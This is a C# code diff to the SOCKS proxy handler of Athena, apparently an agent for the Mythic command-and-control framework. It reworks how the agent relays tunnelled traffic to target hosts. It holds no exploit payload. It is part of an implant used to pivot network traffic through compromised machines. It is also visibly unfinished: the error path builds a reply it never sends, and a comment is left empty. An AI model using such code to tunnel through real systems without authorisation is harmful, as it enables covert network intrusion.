@@ -10,18 +10,22 @@ using System.Threading.Tasks;
 
 namespace Athena.Commands.Model
 {
+    // Good Implementation:
+    
+
     public class SocksHandler
     {
         private CancellationTokenSource ct { get; set; }
-        private ConcurrentDictionary<int, ConnectionOptions> connections { get; set; }
+        private ConcurrentDictionary<int, SocksConnection> connections { get; set; }
         private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
         private ConcurrentQueue<SocksMessage> messagesIn = new ConcurrentQueue<SocksMessage>();
         public bool running { get; set; }
         static object _lock = new object();
+        
         public SocksHandler()
         {
             this.running = false;
-            this.connections = new ConcurrentDictionary<int, ConnectionOptions>();
+            this.connections = new ConcurrentDictionary<int, SocksConnection>();
         }
 
         public bool Start()
@@ -29,27 +33,13 @@ namespace Athena.Commands.Model
             this.ct = new CancellationTokenSource();
             try
             {
-                Task.Run(() => { 
+                Task.Run(() =>
+                {
                     while (!this.ct.IsCancellationRequested)
                     {
                         try
                         {
                             ReadMythicMessages();
-                        }
-                        catch (Exception e)
-                        {
-                            Misc.WriteError(e.Message);
-                            continue;
-                        }
-                    }
-                });
-
-                Task.Run(() => {
-                    while (!this.ct.IsCancellationRequested)
-                    {
-                        try
-                        {
-                            ReadServerMessages();
                         }
                         catch (Exception e)
                         {
@@ -83,36 +73,36 @@ namespace Athena.Commands.Model
                 return false;
             }
         }
-
         public List<SocksMessage> GetMessages()
         {
-            List<SocksMessage> messagesOut;
+            if(this.messagesOut.Count < 1)
+            {
+                return new List<SocksMessage>();
+            }
+
+            List<SocksMessage> msgOut;
 
             lock (_lock)
             {
-                messagesOut = new List<SocksMessage>(this.messagesOut);
+                msgOut = new List<SocksMessage>(this.messagesOut);
                 this.messagesOut.Clear();
             }
-            messagesOut.Reverse();
-            return messagesOut;
+            msgOut.Reverse();
+            return msgOut;
         }
-
         public void AddToQueue(SocksMessage message)
         {
             this.messagesIn.Enqueue(message);
         }
-
         public void ReturnMessage(SocksMessage message)
         {
+            Misc.WriteDebug("Adding message to outqueue.");
             if (Monitor.TryEnter(_lock, 5000))
             {
                 this.messagesOut.Add(message);
                 Monitor.Exit(_lock);
             }
         }
-
-        //This function will take messages FROM mythic and forward them to the Server.
-        //Client -> Mythic -> Athena -> Server
         private void ReadMythicMessages()
         {
             while (!this.ct.IsCancellationRequested)
@@ -123,115 +113,96 @@ namespace Athena.Commands.Model
             }
         }
 
+        private void ReadServerMessages()
+        {
+            Parallel.ForEach(connections, connection =>
+            {
+                if(connection.Value.BytesReceived > 0)
+                {
+                    connection.Value.ReceiveAsync();
+                }
+            });
+        }
+
         public int Count()
         {
             return this.messagesOut.Count();
         }
+
         //This function will send messages from the Server TO mythic.
         //Server -> Athena -> Mythic -> Client
-        private void ReadServerMessages()
-        {
-            while (!this.ct.IsCancellationRequested)
-            {
-                Parallel.ForEach(this.connections, connection =>
-                {
-                    try
-                    {
-                        if (!connection.Value.socket.Connected)
-                        {
-                            SocksMessage smOut = new SocksMessage()
-                            {
-                                server_id = connection.Key,
-                                data = "",
-                                exit = true
-                            };
-
-                            //Add to our messages queue.
-                            ReturnMessage(smOut);
-                            while (!this.connections.TryRemove(connection)) { };
-                        }
-                        else
-                        {
-                            if (connection.Value.socket.Available > 0)
-                            {
-                                List<byte[]> outMessages = connection.Value.receiveMessages();
-
-                                foreach (var msg in outMessages)
-                                {
-                                    SocksMessage smOut = new SocksMessage()
-                                    {
-                                        server_id = connection.Value.server_id,
-                                        data = Misc.Base64Encode(msg),
-                                        exit = false
-                                    };
-                                    ReturnMessage(smOut);
-
-                                }
-                            }
-                        }
-                    }
-                    catch (ObjectDisposedException)
-                    {
-                        //ConnectionOptions cn;
-                        //while (!this.connections.TryRemove(connection.Key, out cn)) { }
-                        //Misc.WriteDebug("Removed Connection.");
-                    }
-                });
-            }
-        }
-
         private void HandleMessage(SocksMessage sm)
         {
-            //https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/agent_code/socks/socks.go#L314
-            //Should I be doing this?
 
             if (this.connections.ContainsKey(sm.server_id))
             {
-                var conn = this.connections[sm.server_id];
-                if (sm.exit)
+                this.connections[sm.server_id].SendAsync(Misc.Base64DecodeToByteArray(sm.data)).ToString();
+                if (!this.connections[sm.server_id].listening)
                 {
-                    this.connections[sm.server_id].socket.Dispose();
-                    while (!this.connections.TryRemove(sm.server_id, out conn)) { };
-                    return;
-                }
-
-                //We already know about this connection, so let's just forward the data.
-                if (!this.connections[sm.server_id].ForwardPacket(sm))
-                {
-                    Misc.WriteDebug("Failed to foward packet.");
-                    //Do Something
+                    this.connections[sm.server_id].StartReceiveAsync();
                 }
             }
             else
             {
-                ConnectionOptions cn = new ConnectionOptions(sm);
+                HandleNewConnection(sm);
+            }
+        }
+        private void HandleNewConnection(SocksMessage sm)
+        {
+            try
+            {
+
+                ConnectionOptions co = new ConnectionOptions(sm);
+                SocksConnection sc = new SocksConnection(co);
+                ConnectResponse cr = new ConnectResponse()
+                {
+                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                    bndport = new byte[] { 0x00, 0x00 },
+                };
+
                 SocksMessage smOut = new SocksMessage()
                 {
                     server_id = sm.server_id
                 };
-                ConnectResponse cr = new ConnectResponse();
 
-                if (cn.connected)
+                if (sc.Connect())
                 {
-                    this.connections.AddOrUpdate(sm.server_id, cn, (key, oldValue) => cn);
+                    //Add connection to tracker
+                    while (!this.connections.TryAdd(sm.server_id, sc)) { }
+                    this.connections.AddOrUpdate(sm.server_id, sc, (key, oldValue) => sc);
                     cr.status = ConnectResponseStatus.Success;
+                    this.connections[sm.server_id].StartReceiveAsync();
                     smOut.exit = false;
+                    //Add to our message queue
                 }
                 else
                 {
                     cr.status = ConnectResponseStatus.GeneralFailure;
                     smOut.exit = true;
                 }
-
-                cr.bndaddr = cn.bndBytes ?? new byte[] { 0x01, 0x00, 0x00, 0x7F };
-                cr.bndport = cn.bndPortBytes ?? new byte[] { 0x00, 0x00 };
-                cr.addrtype = cn.addressType;
+                cr.addrtype = co.addressType;
 
                 //Put our ConnectResponse into the SocksMessage
                 smOut.data = Misc.Base64Encode(cr.ToByte());
 
-                //Add to our message queue
+                //Return message
                 ReturnMessage(smOut);
+            }
+            catch (Exception e)
+            {
+                ConnectResponse cr = new ConnectResponse()
+                {
+                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                    bndport = new byte[] { 0x00, 0x00 },
+                    status = ConnectResponseStatus.GeneralFailure,
+                };
+
+                SocksMessage smOut = new SocksMessage()
+                {
+                    server_id = sm.server_id,
+                    exit = true,
+                    data = Misc.Base64Encode(cr.ToByte())
+                };
             }
         }
     }
